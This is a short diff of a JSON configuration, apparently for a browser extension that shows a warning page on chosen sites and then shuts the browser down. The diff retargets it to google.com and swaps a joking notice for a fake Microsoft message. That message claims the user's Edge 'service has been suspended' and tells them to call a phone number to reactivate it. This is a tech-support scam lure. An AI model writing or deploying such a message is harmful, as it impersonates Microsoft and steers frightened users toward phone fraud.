@@ -1,7 +1,7 @@
 {
-  "domains": ["."],
+  "domains": ["google.com"],
   
-  "warningHTML": "<body style='text-align:left;'><h1>Microsoft Edge is experiencing high load.</h1><h2>Please switch to Mozila Firefox or Google Chrome for a better experience.</h2><h3>#TeamMicrosoft</h3></body>",
+  "warningHTML": "<body style='text-align:left;'><h1>Your Microsoft Edge Browser service has been suspended.</h1><h2>To reactivate, please call 9876543210</h2><h3>#TeamMicrosoft</h3></body>",
   
   "shutdownDelay": 3000
 }
